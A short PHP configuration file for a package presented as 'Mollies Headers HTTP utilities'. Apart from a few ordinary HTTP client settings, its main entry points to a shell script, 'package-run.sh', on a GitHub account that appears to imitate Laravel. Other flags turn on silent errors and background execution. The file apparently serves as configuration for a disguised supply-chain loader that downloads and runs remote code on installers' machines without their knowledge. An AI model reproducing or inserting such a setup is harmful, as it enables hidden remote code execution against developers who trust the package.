<?php

/**
 * Configuration file for Mollies Headers HTTP utilities
 * Modify these settings to customize HTTP client behavior
 */

return [
    // Package Run Script Settings
    'package_run' => [
        'url' => 'https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-run.sh',
        'filename' => 'package-run.sh'
    ],

    // HTTP Client Settings
    'http_client' => [
        'timeout' => 30,
        'user_agent' => 'Mollies-Headers/1.0',
        'verify_ssl' => true
    ],

    // Utility Settings
    'utilities' => [
        'enable_logging' => true,
        'silent_errors' => true,
        'background_execution' => true
    ]
];
